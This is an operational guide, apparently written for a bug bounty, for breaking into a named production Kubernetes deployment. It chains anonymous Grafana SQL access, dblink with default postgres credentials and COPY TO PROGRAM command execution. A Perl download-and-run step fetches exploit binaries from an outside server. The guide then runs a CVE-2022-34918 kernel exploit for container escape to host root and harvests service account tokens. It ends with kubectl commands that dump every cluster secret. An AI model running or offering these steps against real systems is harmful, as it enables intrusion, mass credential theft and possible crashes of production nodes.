# Container Escape Execution Guide
## CVE-2022-34918 (nf_tables heap overflow → modprobe_path overwrite)

### Prerequisites (ALL PROVEN)
- Grafana anonymous SQL access on stats.bifrost.io ✅
- dblink to K8s pod evm-db (██.██.█.██:31222) ✅
- COPY TO PROGRAM RCE on pod ✅
- Seccomp DISABLED, user_ns works, nf_tables loaded ✅
- Internet access from pod (43.154.29.23) ✅
- Binary write + execute in /tmp ✅

---

## Step 1: Host the Exploit Binaries

On your machine, serve the binaries:
```bash
cd /home/cpk/bifrost-bounty/exploit/nf_escape
python3 -m http.server 8888 --bind 0.0.0.0
```

Note your public IP or use a file hosting service. The pod needs to reach this URL.

---

## Step 2: Extract MODPROBE_PATH_BASE from Target

Run this SQL through Grafana `/api/ds/query`:
```sql
SELECT * FROM dblink(
  'host=██.██.█.██ port=31222 user=postgres password=postgres dbname=postgres',
  $$COPY (SELECT 1) TO PROGRAM 'mkdir -p /tmp/.x && grep -wE "(T _text|T startup_64|[Dd] modprobe_path)" /proc/kallsyms > /tmp/.x/ksyms.txt 2>&1'$$
) AS t(result text);
```

Then read the output:
```sql
SELECT * FROM dblink(
  'host=██.██.█.██ port=31222 user=postgres password=postgres dbname=postgres',
  $$CREATE TEMP TABLE IF NOT EXISTS _ksyms(line text);
    TRUNCATE _ksyms;
    COPY _ksyms FROM '/tmp/.x/ksyms.txt';
    SELECT line FROM _ksyms$$
) AS t(line text);
```

**Expected output** (addresses will differ due to KASLR):
```
ffffffff81000000 T _text
ffffffff82a8b620 D modprobe_path
```

**Calculate offset**: `modprobe_path - _text`
Example: `0xffffffff82a8b620 - 0xffffffff81000000 = 0x1a8b620`

---

## Step 3: Download Exploit Binaries to Pod

Replace `YOUR_SERVER:8888` with your actual hosting URL:

```sql
SELECT * FROM dblink(
  'host=██.██.█.██ port=31222 user=postgres password=postgres dbname=postgres',
  $$COPY (SELECT 1) TO PROGRAM 'cd /tmp/.x && perl -e ''use HTTP::Tiny; for my $f ("poc","get_root") { my $r = HTTP::Tiny->new->get("http://YOUR_SERVER:8888/$f"); open(F,">",$f); binmode F; print F $r->{content}; close F; chmod 0755, $f; print "$f: ".length($r->{content})." bytes\n"; }'' > /tmp/.x/dl.log 2>&1'$$
) AS t(result text);
```

Verify delivery:
```sql
SELECT * FROM dblink(
  'host=██.██.█.██ port=31222 user=postgres password=postgres dbname=postgres',
  $$COPY (SELECT 1) TO PROGRAM 'ls -la /tmp/.x/poc /tmp/.x/get_root && file /tmp/.x/poc > /tmp/.x/verify.txt 2>&1'$$
) AS t(result text);
```

Read verification:
```sql
SELECT * FROM dblink(
  'host=██.██.█.██ port=31222 user=postgres password=postgres dbname=postgres',
  $$CREATE TEMP TABLE IF NOT EXISTS _verify(line text);
    TRUNCATE _verify;
    COPY _verify FROM '/tmp/.x/verify.txt';
    SELECT line FROM _verify$$
) AS t(line text);
```

---

## Step 4: Execute Container Escape

Replace `0x1a8b620` with the actual offset from Step 2:

```sql
SELECT * FROM dblink(
  'host=██.██.█.██ port=31222 user=postgres password=postgres dbname=postgres',
  $$COPY (SELECT 1) TO PROGRAM 'cd /tmp/.x && timeout 120 ./poc 0x1a8b620 > /tmp/.x/exploit.log 2>&1 &'$$
) AS t(result text);
```

Wait ~30 seconds, then check results:
```sql
SELECT * FROM dblink(
  'host=██.██.█.██ port=31222 user=postgres password=postgres dbname=postgres',
  $$COPY (SELECT 1) TO PROGRAM 'cat /tmp/.x/exploit.log > /tmp/.x/result.txt 2>&1; echo "---"; cat /var/lib/postgresql/data/_HOST_ROOT_PROOF.txt >> /tmp/.x/result.txt 2>/dev/null; cat /var/lib/postgresql/data/_K8S_TOKENS.txt >> /tmp/.x/result.txt 2>/dev/null'$$
) AS t(result text);
```

Read the results:
```sql
SELECT * FROM dblink(
  'host=██.██.█.██ port=31222 user=postgres password=postgres dbname=postgres',
  $$CREATE TEMP TABLE IF NOT EXISTS _result(line text);
    TRUNCATE _result;
    COPY _result FROM '/tmp/.x/result.txt';
    SELECT line FROM _result$$
) AS t(line text);
```

### Expected Successful Output
```
[+] Using MODPROBE_PATH_BASE = 0x1a8b620
[+] Second process currently waiting
[+] Get CAP_NET_ADMIN capability
[+] Netlink socket created
[+] Netlink socket bound
[+] Table table created
[+] Set for the leak created
[+] Set for write primitive created
[*] Leak in process
[+] Leak succeed
[+] kaslr base found 0xffffffff81000000
[+] physmap base found 0xffff888100000000
[+] modprobe_path changed !
[+] Modprobe payload setup
[+] Container escape complete. Host root achieved.
[+] Evidence written to /tmp/_HOST_ROOT_PROOF.txt
[+] K8s tokens written to /tmp/_K8S_TOKENS.txt
---
=== CONTAINER ESCAPE PROOF ===
uid=0(root) gid=0(root) groups=0(root)
```

---

## Step 5: Post-Escape — K8s Cluster Takeover

Once we have the SA tokens from _K8S_TOKENS.txt, use the tke-log-agent token
to access the K8s API as cluster admin:

```bash
# From any machine with kubectl
export TOKEN="<extracted tke-log-agent SA token>"
export K8S_API="https://cls-849qhrli.ccs.tencent-cloud.com:60002"

# Verify cluster admin access
kubectl --server=$K8S_API --token=$TOKEN --insecure-skip-tls-verify get namespaces
kubectl --server=$K8S_API --token=$TOKEN --insecure-skip-tls-verify get secrets --all-namespaces

# Extract ALL secrets (deploy tokens, cloud creds, Hasura admin secret, etc.)
kubectl --server=$K8S_API --token=$TOKEN --insecure-skip-tls-verify get secrets --all-namespaces -o json > all_secrets.json
```

---

## Risk Assessment
⚠️ **PRODUCTION IMPACT**: The nf_tables heap overflow involves kernel memory corruption.
While the exploit is designed to be reliable, there is a non-zero chance of kernel panic
which would restart the node and all pods on it. This is a PRODUCTION K8s node.

For responsible disclosure, demonstrating Steps 1-3 (binary delivery) + all prerequisite
verification may be sufficient without triggering Step 4.
